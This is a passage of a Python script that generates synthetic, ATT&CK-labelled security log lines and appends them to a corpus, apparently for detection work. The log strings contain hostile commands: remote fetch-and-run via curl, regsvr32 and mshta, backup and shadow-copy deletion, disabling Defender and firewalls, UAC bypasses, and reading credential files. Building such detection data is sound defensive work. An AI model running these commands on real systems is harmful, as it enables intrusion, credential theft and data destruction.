        ("2024-02-12T14:20:00Z WORKSTATION241 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=New-LocalUser -Name evil -Password (ConvertTo-SecureString 'Pass1' -AsPlainText -Force) user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1136.001", "high", "New-LocalUser PowerShell."),
        ("Feb 12 14:25:00 host152 audit: type=EXECVE pid=14020 uid=0 cmdline=adduser --disabled-password --gecos '' svcbd", "Linux", "AuditD", "Malicious", "T1136.001", "high", "adduser creating a service-account-style identity."),
        ("2024-02-12T14:30:00Z DC16 WinEvent EventID=4720: A user account was created. Account Name: CORP\\svc_bd  Created By: CORP\\attacker", "Windows", "Winlogbeat", "Malicious", "T1136.002", "high", "Another domain account creation event."),
        ("Feb 12 14:35:00 host153 audit: type=EXECVE pid=14030 uid=0 cmdline=newusers /tmp/users.txt", "Linux", "AuditD", "Malicious", "T1136.001", "high", "newusers creating accounts from a batch file."),
        ("2024-02-12T14:40:00Z WORKSTATION242 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\net.exe cmdline=net user guest2 /add /active:yes user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1136.001", "high", "Creating guest2 local user."),
        ("Feb 12 14:45:00 host154 audit: type=EXECVE pid=14040 uid=0 cmdline=useradd -r -s /sbin/nologin hiddensvc", "Linux", "AuditD", "Malicious", "T1136.001", "high", "Creating a system user with nologin shell - stealth service account."),
        ("2024-02-12T14:50:00Z CLOUDAPI aws: event=CreateUser user=attacker userName=backdoor-admin sourceIPAddress=203.0.113.80", "Cloud", "CloudTrail", "Malicious", "T1136.003", "high", "AWS IAM CreateUser by compromised identity."),
        ("2024-02-12T14:55:00Z CLOUDAPI azure: event=CreateUser user=admin@corp.example newUserPrincipalName=evil@corp.example", "Cloud", "AzureAD", "Malicious", "T1136.003", "high", "Azure AD user creation."),
        ("2024-02-12T15:00:00Z WORKSTATION243 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=New-ADUser -Name svc_hidden -Enabled $true -AccountPassword (ConvertTo-SecureString 'Temp1' -AsPlainText -Force) user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1136.002", "high", "New-ADUser creating a domain account via PowerShell."),
        ("Feb 12 15:05:00 host155 audit: type=EXECVE pid=14050 uid=0 cmdline=useradd -m -g wheel rootlike", "Linux", "AuditD", "Malicious", "T1136.001", "high", "useradd directly into wheel group - privileged account."),
        ("2024-02-12T15:10:00Z WORKSTATION244 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\net.exe cmdline=net user sysacct Temp1 /add /expires:never user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1136.001", "high", "Creating a non-expiring local account."),
    ]),
    # T1197 BITS (currently 5) -> +15
    ("T1197", [
        (f"2024-02-12T15:{15+i}:00Z WORKSTATION{250+i} Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\bitsadmin.exe cmdline=bitsadmin /transfer j{i} http://198.51.100.{80+i}/p{i}.exe C:\\Users\\Public\\p{i}.exe user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1197", "high", f"bitsadmin /transfer of payload (sample {i+1}).")
        for i in range(15)
    ]),
    # T1204 User Execution (currently 5) -> +15
    ("T1204", [
        ("2024-02-12T15:30:00Z WORKSTATION260 Sysmon EventID=1: Process Create. process=C:\\Users\\jdoe\\Downloads\\invoice123.exe user=CORP\\jdoe parent_process=C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "Windows", "Sysmon", "Malicious", "T1204.002", "high", "User-executed EXE from Downloads via Outlook."),
        ("2024-02-12T15:35:00Z WORKSTATION261 Sysmon EventID=1: Process Create. process=C:\\Users\\Public\\setup.hta user=CORP\\jdoe parent_process=C:\\Windows\\Explorer.exe", "Windows", "Sysmon", "Malicious", "T1204.002", "high", "User-executed HTA from Public."),
        ("2024-02-12T15:40:00Z WORKSTATION262 Sysmon EventID=1: Process Create. process=C:\\Users\\jdoe\\AppData\\Local\\Temp\\pay.scr user=CORP\\jdoe parent_process=C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "Windows", "Sysmon", "Malicious", "T1204.002", "high", "User-run .scr from browser Temp."),
        ("2024-02-12T15:45:00Z WORKSTATION263 Sysmon EventID=1: Process Create. process=C:\\Users\\kchen\\Downloads\\update.bat user=CORP\\kchen parent_process=C:\\Windows\\Explorer.exe", "Windows", "Sysmon", "Malicious", "T1204.002", "high", "User double-clicked a .bat in Downloads."),
        ("2024-02-12T15:50:00Z WORKSTATION264 Sysmon EventID=1: Process Create. process=C:\\Users\\mjones\\Downloads\\resume.docm user=CORP\\mjones parent_process=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "Windows", "Sysmon", "Malicious", "T1204.002", "high", "Macro-enabled resume.docm opened in Word."),
        ("2024-02-12T15:55:00Z WORKSTATION265 Sysmon EventID=1: Process Create. process=C:\\Users\\jdoe\\Downloads\\quote.lnk user=CORP\\jdoe parent_process=C:\\Windows\\Explorer.exe", "Windows", "Sysmon", "Malicious", "T1204.002", "high", "User opened a malicious .lnk from Downloads."),
        ("2024-02-12T16:00:00Z WORKSTATION266 Sysmon EventID=1: Process Create. process=C:\\Users\\Public\\patcher.vbs user=CORP\\a parent_process=C:\\Windows\\Explorer.exe", "Windows", "Sysmon", "Malicious", "T1204.002", "high", "VBS under Public executed via Explorer - user execution path."),
        ("2024-02-12T16:05:00Z WORKSTATION267 Sysmon EventID=1: Process Create. process=C:\\Users\\jdoe\\Downloads\\archive.exe user=CORP\\jdoe parent_process=C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "Windows", "Sysmon", "Malicious", "T1204.002", "high", "Archive.exe run from Downloads after browser download."),
        ("Feb 12 16:10:00 host160 audit: type=EXECVE pid=15000 uid=1000 cmdline=/home/jdoe/Downloads/installer.sh", "Linux", "AuditD", "Malicious", "T1204.002", "high", "User ran a shell installer from ~/Downloads."),
        ("Feb 12 16:15:00 host161 audit: type=EXECVE pid=15010 uid=1000 cmdline=/tmp/discord-updater.bin", "Linux", "AuditD", "Malicious", "T1204.002", "high", "User ran a tempting impostor binary from /tmp."),
        ("2024-02-12T16:20:00Z WORKSTATION268 Sysmon EventID=1: Process Create. process=C:\\Users\\jdoe\\AppData\\Local\\Temp\\setup_win.exe user=CORP\\jdoe parent_process=C:\\Program Files\\7-Zip\\7zG.exe", "Windows", "Sysmon", "Malicious", "T1204.002", "high", "EXE extracted from a 7z archive and run."),
        ("2024-02-12T16:25:00Z WORKSTATION269 Sysmon EventID=1: Process Create. process=C:\\Users\\kchen\\Desktop\\invoice.pdf.exe user=CORP\\kchen parent_process=C:\\Windows\\Explorer.exe", "Windows", "Sysmon", "Malicious", "T1204.002", "high", "Double-extension PDF.EXE on Desktop - classic lure."),
        ("Feb 12 16:30:00 host162 audit: type=EXECVE pid=15020 uid=1000 cmdline=/home/mjones/Downloads/zoom-plugin.sh", "Linux", "AuditD", "Malicious", "T1204.002", "high", "User ran a fake Zoom plugin installer from Downloads."),
        ("2024-02-12T16:35:00Z WORKSTATION270 Sysmon EventID=1: Process Create. process=C:\\Users\\Public\\reader.exe user=CORP\\jdoe parent_process=C:\\Windows\\Explorer.exe", "Windows", "Sysmon", "Malicious", "T1204.002", "high", "Suspicious reader.exe in Public launched by user."),
        ("2024-02-12T16:40:00Z WORKSTATION271 Sysmon EventID=1: Process Create. process=C:\\Users\\jdoe\\Downloads\\photo.jpeg.exe user=CORP\\jdoe parent_process=C:\\Windows\\Explorer.exe", "Windows", "Sysmon", "Malicious", "T1204.002", "high", "Double-extension image.exe - user-execution lure."),
    ]),
    # T1218 System Binary Proxy Exec (currently 5) -> +15
    ("T1218", [
        ("2024-02-12T16:45:00Z WORKSTATION280 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\rundll32.exe cmdline=rundll32.exe C:\\Users\\Public\\m.dll,Entry user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218.011", "high", "rundll32 calling EntryPoint in attacker DLL."),
        ("2024-02-12T16:50:00Z WORKSTATION281 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\regsvr32.exe cmdline=regsvr32 /s /u /i:http://198.51.100.90/a.sct scrobj.dll user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218.010", "high", "regsvr32 /i with remote SCT - LOLBin proxy exec."),
        ("2024-02-12T16:55:00Z WORKSTATION282 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\mshta.exe cmdline=mshta.exe http://198.51.100.91/x.hta user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218.005", "high", "mshta remote HTA execution."),
        ("2024-02-12T17:00:00Z WORKSTATION283 Sysmon EventID=1: Process Create. process=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe cmdline=InstallUtil.exe /logfile= /LogToConsole=false C:\\Users\\Public\\p.dll user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218.004", "high", "InstallUtil with /logfile= to avoid logs."),
        ("2024-02-12T17:05:00Z WORKSTATION284 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\cmstp.exe cmdline=cmstp.exe /s /ni C:\\Users\\Public\\i.inf user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218.003", "high", "cmstp silent install from user path."),
        ("2024-02-12T17:10:00Z WORKSTATION285 Sysmon EventID=1: Process Create. process=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe cmdline=MSBuild.exe C:\\Users\\Public\\b.xml user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218", "high", "MSBuild running an attacker-supplied XML project - LOLBin compile-exec."),
        ("2024-02-12T17:15:00Z WORKSTATION286 Sysmon EventID=1: Process Create. process=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe cmdline=csc.exe /target:exe /out:C:\\Users\\Public\\pay.exe C:\\Users\\Public\\pay.cs user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218", "high", "Local C# compile via csc.exe - living off the land."),
        ("2024-02-12T17:20:00Z WORKSTATION287 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\rundll32.exe cmdline=rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject('script:http://198.51.100.92/s.sct').Exec() user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218.011", "high", "rundll32 javascript: URI running remote script - LOLBin proxy."),
        ("2024-02-12T17:25:00Z WORKSTATION288 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\regsvr32.exe cmdline=regsvr32 /s /n /u /i:file://C:\\Users\\Public\\bad.sct scrobj.dll user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218.010", "high", "Squiblydoo regsvr32 running local SCT."),
        ("2024-02-12T17:30:00Z WORKSTATION289 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\mavinject.exe cmdline=mavinject.exe 1234 /INJECTRUNNING C:\\Users\\Public\\p.dll user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218.013", "high", "mavinject signed-binary injection."),
        ("2024-02-12T17:35:00Z WORKSTATION290 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\bash.exe cmdline=bash.exe -c 'curl -s http://198.51.100.93/s | bash' user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218", "medium", "WSL bash.exe proxying a shell-exec LOLBin."),
        ("2024-02-12T17:40:00Z WORKSTATION291 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\forfiles.exe cmdline=forfiles /p c:\\windows\\system32 /m notepad.exe /c 'cmd /c calc.exe' user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218", "medium", "forfiles launching cmd indirectly - LOLBin child proc."),
        ("2024-02-12T17:45:00Z WORKSTATION292 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\pcwrun.exe cmdline=pcwrun.exe C:\\Users\\Public\\p.exe user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218", "medium", "pcwrun acting as signed-binary launcher for attacker EXE."),
        ("2024-02-12T17:50:00Z WORKSTATION293 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\conhost.exe cmdline=conhost.exe --headless cmd /c 'curl http://198.51.100.94/s | cmd' user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218", "medium", "conhost with --headless piping remote shell commands."),
        ("2024-02-12T17:55:00Z WORKSTATION294 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\odbcconf.exe cmdline=odbcconf.exe /a {regsvr C:\\Users\\Public\\m.dll} user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1218", "high", "odbcconf LOLBin registering an attacker DLL."),
    ]),
    # T1482 Domain Trust Discovery (currently 5) -> +15
    ("T1482", [
        (f"2024-02-12T18:{i:02d}:00Z WORKSTATION{300+i} Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\nltest.exe cmdline=nltest /{['domain_trusts','dclist:corp.example.com','dsgetdc:corp.example.com'][i%3]} user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1482", "high", f"nltest AD trust/DC discovery (sample {i+1}).")
        for i in range(15)
    ]),
    # T1490 Inhibit System Recovery (currently 5) -> +15
    ("T1490", [
        ("2024-02-13T08:00:00Z WORKSTATION310 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\vssadmin.exe cmdline=vssadmin delete shadows /all /quiet user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1490", "high", "vssadmin delete shadows /all - shadow copy wipe."),
        ("2024-02-13T08:05:00Z WORKSTATION311 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbem\\WMIC.exe cmdline=wmic shadowcopy delete user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1490", "high", "wmic shadowcopy delete."),
        ("2024-02-13T08:10:00Z WORKSTATION312 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\bcdedit.exe cmdline=bcdedit /set {default} recoveryenabled no user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1490", "high", "bcdedit disabling Windows Recovery."),
        ("2024-02-13T08:15:00Z WORKSTATION313 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\bcdedit.exe cmdline=bcdedit /set {default} bootstatuspolicy ignoreallfailures user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1490", "high", "bcdedit ignoring boot failures."),
        ("2024-02-13T08:20:00Z WORKSTATION314 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbadmin.exe cmdline=wbadmin delete systemstatebackup -quiet user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1490", "high", "wbadmin delete systemstatebackup."),
        ("2024-02-13T08:25:00Z WORKSTATION315 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbadmin.exe cmdline=wbadmin delete catalog -quiet user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1490", "high", "wbadmin delete catalog."),
        ("2024-02-13T08:30:00Z WORKSTATION316 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete() } user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1490", "high", "PowerShell pipeline deleting all Shadowcopy instances."),
        ("Feb 13 08:35:00 host170 audit: type=EXECVE pid=16000 uid=0 cmdline=btrfs subvolume delete /mnt/snapshots/auto_*", "Linux", "AuditD", "Malicious", "T1490", "high", "Deleting btrfs snapshots - Linux shadow analogue."),
        ("Feb 13 08:40:00 host171 audit: type=EXECVE pid=16010 uid=0 cmdline=rm -rf /.snapshots/*", "Linux", "AuditD", "Malicious", "T1490", "high", "Removing zfs/snapper snapshots."),
        ("2024-02-13T08:45:00Z WORKSTATION317 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reagentc.exe cmdline=reagentc /disable user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1490", "high", "reagentc disabling Windows Recovery Environment."),
        ("Feb 13 08:50:00 host172 audit: type=EXECVE pid=16020 uid=0 cmdline=zfs destroy -r rpool/backups", "Linux", "AuditD", "Malicious", "T1490", "high", "Recursive destroy of zfs backups dataset."),
        ("2024-02-13T08:55:00Z WORKSTATION318 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\vssadmin.exe cmdline=vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1490", "high", "vssadmin resize shadowstorage to a tiny value - forces shadow deletion."),
        ("Feb 13 09:00:00 host173 audit: type=EXECVE pid=16030 uid=0 cmdline=rsnapshot -v delete monthly", "Linux", "AuditD", "Malicious", "T1490", "high", "rsnapshot deleting monthly backups."),
        ("2024-02-13T09:05:00Z WORKSTATION319 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wbem\\WMIC.exe cmdline=wmic.exe volume where DriveLetter='D:' delete user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1490", "medium", "wmic deleting a backup volume reference."),
        ("Feb 13 09:10:00 host174 audit: type=EXECVE pid=16040 uid=0 cmdline=borg delete --force /srv/backups::daily-2024-02-01", "Linux", "AuditD", "Malicious", "T1490", "high", "Force-deleting a borg backup archive."),
    ]),
    # T1548 Abuse Elevation Control (currently 5) -> +15
    ("T1548", [
        ("Feb 13 09:15:00 host180 audit: type=EXECVE pid=17000 uid=0 cmdline=find / -perm -u+s -type f 2>/dev/null", "Linux", "AuditD", "Malicious", "T1548.003", "high", "Searching for setuid binaries - privesc recon."),
        ("Feb 13 09:20:00 host181 audit: type=EXECVE pid=17010 uid=0 cmdline=chmod u+s /usr/local/bin/helper", "Linux", "AuditD", "Malicious", "T1548.003", "high", "chmod u+s creating a setuid binary."),
        ("2024-02-13T09:25:00Z WORKSTATION330 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\eventvwr.exe parent_process=C:\\Users\\Public\\bypass.exe user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1548.002", "high", "eventvwr UAC bypass."),
        ("2024-02-13T09:30:00Z WORKSTATION331 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\fodhelper.exe parent_process=C:\\Users\\Public\\bypass.exe user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1548.002", "high", "fodhelper UAC bypass."),
        ("2024-02-13T09:35:00Z WORKSTATION332 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\sdclt.exe parent_process=C:\\Users\\Public\\bypass.exe user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1548.002", "high", "sdclt UAC bypass."),
        ("Feb 13 09:40:00 host182 audit: type=EXECVE pid=17020 uid=0 cmdline=getcap -r / 2>/dev/null", "Linux", "AuditD", "Malicious", "T1548.003", "high", "getcap recursive - looking for binary capabilities to abuse."),
        ("Feb 13 09:45:00 host183 audit: type=EXECVE pid=17030 uid=0 cmdline=setcap cap_setuid+ep /usr/local/bin/helper", "Linux", "AuditD", "Malicious", "T1548.003", "high", "setcap cap_setuid on a helper - Linux privilege escalation."),
        ("2024-02-13T09:50:00Z WORKSTATION333 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\ComputerDefaults.exe parent_process=C:\\Users\\Public\\b.exe user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1548.002", "high", "ComputerDefaults UAC bypass variant."),
        ("Feb 13 09:55:00 host184 audit: type=EXECVE pid=17040 uid=1000 cmdline=sudo -l", "Linux", "AuditD", "Suspicious", "T1548.003", "medium", "Checking sudo rights - user enumerating elevation."),
        ("Feb 13 10:00:00 host185 audit: type=EXECVE pid=17050 uid=1000 cmdline=pkexec /bin/bash", "Linux", "AuditD", "Malicious", "T1548.003", "high", "pkexec launching bash - likely pkexec-CVE exploitation."),
        ("2024-02-13T10:05:00Z WORKSTATION334 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\slui.exe parent_process=C:\\Users\\Public\\b.exe user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1548.002", "high", "slui UAC bypass."),
        ("Feb 13 10:10:00 host186 audit: type=EXECVE pid=17060 uid=1000 cmdline=sudo /bin/bash", "Linux", "AuditD", "Suspicious", "T1548.003", "medium", "Elevating to root shell via sudo."),
        ("2024-02-13T10:15:00Z WORKSTATION335 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\CompMgmtLauncher.exe parent_process=C:\\Users\\Public\\b.exe user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1548.002", "high", "CompMgmtLauncher UAC bypass."),
        ("Feb 13 10:20:00 host187 audit: type=EXECVE pid=17070 uid=0 cmdline=chmod 4755 /usr/local/bin/helper", "Linux", "AuditD", "Malicious", "T1548.003", "high", "Octal chmod setting setuid bit."),
        ("2024-02-13T10:25:00Z WORKSTATION336 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d C:\\Users\\Public\\b.exe /f user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1548.002", "high", "Registry hijack of ms-settings shell open - UAC bypass setup."),
    ]),
    # T1552 Unsecured Credentials (currently 7) -> +13
    ("T1552", [
        ("2024-02-13T10:30:00Z WORKSTATION340 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\findstr.exe cmdline=findstr /s /i password C:\\inetpub\\*.config user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1552.001", "high", "findstr for 'password' recursive in web configs."),
        ("Feb 13 10:35:00 host190 audit: type=EXECVE pid=18000 uid=33 cmdline=grep -ri 'aws_secret_access_key' /var/www", "Linux", "AuditD", "Malicious", "T1552.001", "high", "grep for AWS secret access key in web root."),
        ("2024-02-13T10:40:00Z WORKSTATION341 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Select-String -Path C:\\Users\\*.txt -Pattern 'password=' user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1552.001", "high", "Select-String for password= in user .txt files."),
        ("Feb 13 10:45:00 host191 audit: type=EXECVE pid=18010 uid=33 cmdline=cat /home/jsmith/.ssh/id_rsa", "Linux", "AuditD", "Malicious", "T1552.004", "high", "Reading another user's SSH private key."),
        ("Feb 13 10:50:00 host192 audit: type=EXECVE pid=18020 uid=33 cmdline=tar czf /tmp/.ssh.tgz /home/*/.ssh", "Linux", "AuditD", "Malicious", "T1552.004", "high", "Archiving all users' .ssh directories."),
        ("2024-02-13T10:55:00Z WORKSTATION342 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-ChildItem -Recurse -Path C:\\ -Filter 'credentials' user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1552.001", "high", "Recursive Get-ChildItem with filter for credential files."),
        ("Feb 13 11:00:00 host193 audit: type=EXECVE pid=18030 uid=33 cmdline=grep -r 'api_key' /etc 2>/dev/null", "Linux", "AuditD", "Malicious", "T1552.001", "high", "grep for api_key across /etc."),
        ("2024-02-13T11:05:00Z WORKSTATION343 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\cmd.exe cmdline=cmd /c findstr /s /i 'connectionstring' C:\\Users\\*.config user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1552.001", "high", "findstr for connectionstring in user config files."),
        ("Feb 13 11:10:00 host194 audit: type=EXECVE pid=18040 uid=33 cmdline=cat /etc/mysql/debian.cnf", "Linux", "AuditD", "Malicious", "T1552.001", "high", "Reading debian MySQL creds file."),
        ("Feb 13 11:15:00 host195 audit: type=EXECVE pid=18050 uid=33 cmdline=cat ~/.aws/credentials", "Linux", "AuditD", "Malicious", "T1552.001", "high", "Reading AWS credentials file."),
        ("2024-02-13T11:20:00Z WORKSTATION344 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-ChildItem C:\\Users\\*\\.aws\\credentials -Recurse user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1552.001", "high", "Enumerating users' AWS credential files."),
        ("Feb 13 11:25:00 host196 audit: type=EXECVE pid=18060 uid=33 cmdline=cat /etc/kubernetes/admin.conf", "Linux", "AuditD", "Malicious", "T1552.001", "high", "Reading kubernetes admin.conf."),
        ("2024-02-13T11:30:00Z WORKSTATION345 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\vaultcmd.exe cmdline=vaultcmd /listcreds:'Windows Credentials' /all user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1552.001", "high", "vaultcmd listing all Credential Manager creds."),
    ]),
    # T1562 Impair Defenses (currently 5) -> +15
    ("T1562", [
        ("2024-02-13T11:35:00Z WORKSTATION350 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\net.exe cmdline=net stop WinDefend user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1562.001", "high", "Stopping WinDefend service."),
        ("2024-02-13T11:40:00Z WORKSTATION351 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\sc.exe cmdline=sc config WinDefend start= disabled user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1562.001", "high", "sc configuring WinDefend to disabled."),
        ("2024-02-13T11:45:00Z WORKSTATION352 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Set-MpPreference -DisableRealtimeMonitoring $true user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1562.001", "high", "Disabling Defender real-time monitoring."),
        ("2024-02-13T11:50:00Z WORKSTATION353 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Add-MpPreference -ExclusionPath 'C:\\Users\\Public' user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1562.001", "high", "Adding AV exclusion for Public."),
        ("Feb 13 11:55:00 host200 audit: type=EXECVE pid=19000 uid=0 cmdline=systemctl stop auditd", "Linux", "AuditD", "Malicious", "T1562.001", "high", "Stopping auditd."),
        ("Feb 13 12:00:00 host201 audit: type=EXECVE pid=19010 uid=0 cmdline=systemctl stop rsyslog", "Linux", "AuditD", "Malicious", "T1562.001", "high", "Stopping rsyslog."),
        ("Feb 13 12:05:00 host202 audit: type=EXECVE pid=19020 uid=0 cmdline=systemctl stop firewalld", "Linux", "AuditD", "Malicious", "T1562.004", "high", "Stopping firewalld."),
        ("Feb 13 12:10:00 host203 audit: type=EXECVE pid=19030 uid=0 cmdline=iptables -F", "Linux", "AuditD", "Malicious", "T1562.004", "high", "Flushing iptables rules."),
        ("Feb 13 12:15:00 host204 audit: type=EXECVE pid=19040 uid=0 cmdline=systemctl stop fail2ban", "Linux", "AuditD", "Malicious", "T1562.001", "high", "Stopping fail2ban."),
        ("2024-02-13T12:20:00Z WORKSTATION354 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\net.exe cmdline=net stop Sense user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1562.001", "high", "Stopping Windows Defender ATP service (Sense)."),
        ("2024-02-13T12:25:00Z WORKSTATION355 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\fsutil.exe cmdline=fsutil usn deletejournal /D C: user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1562.001", "high", "Deleting USN journal - impairs file-change tracking."),
        ("Feb 13 12:30:00 host205 audit: type=EXECVE pid=19050 uid=0 cmdline=setenforce 0", "Linux", "AuditD", "Malicious", "T1562.001", "high", "Disabling SELinux enforcement."),
        ("2024-02-13T12:35:00Z WORKSTATION356 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Set-MpPreference -DisableIOAVProtection $true user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1562.001", "high", "Disabling Defender IOAV protection."),
        ("Feb 13 12:40:00 host206 audit: type=EXECVE pid=19060 uid=0 cmdline=ufw disable", "Linux", "AuditD", "Malicious", "T1562.004", "high", "Disabling UFW firewall."),
        ("2024-02-13T12:45:00Z WORKSTATION357 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\sc.exe cmdline=sc stop SecurityHealthService user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1562.001", "high", "Stopping Windows Security Health Service."),
    ]),
    # T1595 Active Scanning (currently 5) -> +15
    ("T1595", [
        (f"date=2024-02-13 time=13:{i:02d}:00 devname=FG-EDGE-01 type=traffic srcip=203.0.113.{50+i} dstip=10.0.5.{10+i} dstport={[22,3389,445,80,443,21,23,25,110,143,8080,8443,5900,3306,5432][i]} action=deny sentbyte={20+i*5} rcvdbyte=0 proto=6 service=unknown", "Firewall", "Fortinet KV", "Malicious", "T1595", "high", f"Denied external probe on common service port (sample {i+1}).")
        for i in range(15)
    ]),
]


def main() -> int:
    existing_rows: list[dict] = []
    with CORPUS.open(encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                existing_rows.append(json.loads(line))
            except json.JSONDecodeError:
                pass
    existing_counts = Counter(
        str(r.get("metadata", {}).get("attack_mapping", "?")).split(".")[0]
        for r in existing_rows
    )

    new_rows: list[dict] = list(BENIGN_EXTRA)
    for parent, recipes in ATTACK_FILL_V2:
        for recipe in recipes:
            raw_log, family, subtype, intent, mapping, confidence, note = recipe
            new_rows.append(
                row(raw_log, family, subtype, intent, mapping, confidence, note)
            )

    with CORPUS.open("a", encoding="utf-8") as fh:
        for record in new_rows:
            fh.write(json.dumps(record, ensure_ascii=False) + "\n")

    # Re-count and report.
    combined = existing_rows + new_rows
    parents = Counter(
        str(r.get("metadata", {}).get("attack_mapping", "?")).split(".")[0]
        for r in combined
    )
